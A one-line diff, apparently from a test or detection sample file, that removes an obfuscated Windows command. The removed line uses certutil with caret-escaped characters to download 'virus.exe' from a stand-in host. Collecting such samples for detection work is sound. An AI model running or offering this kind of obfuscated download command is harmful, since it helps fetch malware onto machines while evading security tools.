@@ -1,1 +1,0 @@
-cmd /c "certutil -verifyctl -f -split h^^^^^^^^^^^^^t^^^^^^^^^^^^6t^^^^^^^p://example.com/virus.exe"
